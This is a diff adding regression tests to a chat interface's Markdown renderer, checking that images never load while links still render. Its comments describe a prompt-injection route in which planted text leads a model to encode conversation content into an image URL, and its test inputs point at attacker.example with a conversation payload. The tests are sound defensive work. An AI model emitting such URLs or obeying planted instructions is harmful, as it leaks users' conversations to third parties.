@@ -65,6 +65,39 @@ describe('★ nothing in an answer can execute', () => {
     );
   });
 
+  it('★ never loads an image, so a Markdown image cannot exfiltrate the conversation', () => {
+    // ★ REGRESSION, P1. `![x](https://attacker.example/?d=…)` renders an <img> whose src the
+    // browser fetches IMMEDIATELY — no click, no warning. A model told to encode conversation
+    // content into that URL, by its own confusion or by text planted in a pasted document,
+    // would ship it to a third party just by being displayed. The earlier XSS tests all
+    // covered constructs that need a click or an executor; this one needs neither.
+    renderMarkdown('Look: ![secret](https://attacker.example/?d=CONVERSATION)');
+    const root = screen.getByTestId('assistant-markdown');
+    expect(root.querySelector('img')).toBeNull();
+    expect(root.querySelector('[src]')).toBeNull();
+    expect(root.innerHTML).not.toContain('attacker.example');
+    // The reader is told an image was referred to, rather than silently seeing nothing.
+    const marker = screen.getByTestId('assistant-image-blocked');
+    expect(marker).toHaveTextContent('secret');
+  });
+
+  it('refuses a src for every scheme, while the same URL is still fine as a link', () => {
+    // The attribute is what matters, not the scheme: https is safe to LINK and never safe to
+    // LOAD. Pinned on the pure function so the policy is legible without a render.
+    for (const url of ['https://example.test/a.png', 'http://example.test/a.png', '/local.png']) {
+      expect(safeUrl(url, 'src'), url).toBeNull();
+      expect(safeUrl(url, 'href'), url).not.toBeNull();
+    }
+  });
+
+  it('still renders a link to the same host, because a link needs a click', () => {
+    renderMarkdown('[click](https://attacker.example/?d=CONVERSATION)');
+    expect(screen.getByRole('link', { name: 'click' })).toHaveAttribute(
+      'href',
+      'https://attacker.example/?d=CONVERSATION',
+    );
+  });
+
   it('never reaches the DOM through dangerouslySetInnerHTML', () => {
     // A structural check on the module itself: the string must not appear in this feature.
     // (The behavioural tests above prove the outcome; this pins the mechanism.)
